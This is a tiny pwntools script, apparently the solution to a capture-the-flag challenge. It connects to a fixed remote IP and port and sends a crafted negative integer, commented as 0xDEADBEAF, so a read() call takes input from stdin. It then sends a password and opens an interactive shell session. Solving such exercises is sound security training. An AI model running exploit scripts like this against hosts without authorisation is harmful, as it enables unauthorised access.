from pwn import *

r = remote('140.113.207.233',8811)
"""
ssize_t read(int fd, void *buf, size_t count);
fd = 0: read input from terminal
"""
r.recvline()
r.sendline('-559038801') # DEC -559038801 = 0xDEADBEAF
r.recvline()
r.sendline('YOUSHALLNOTPASS')
r.interactive()
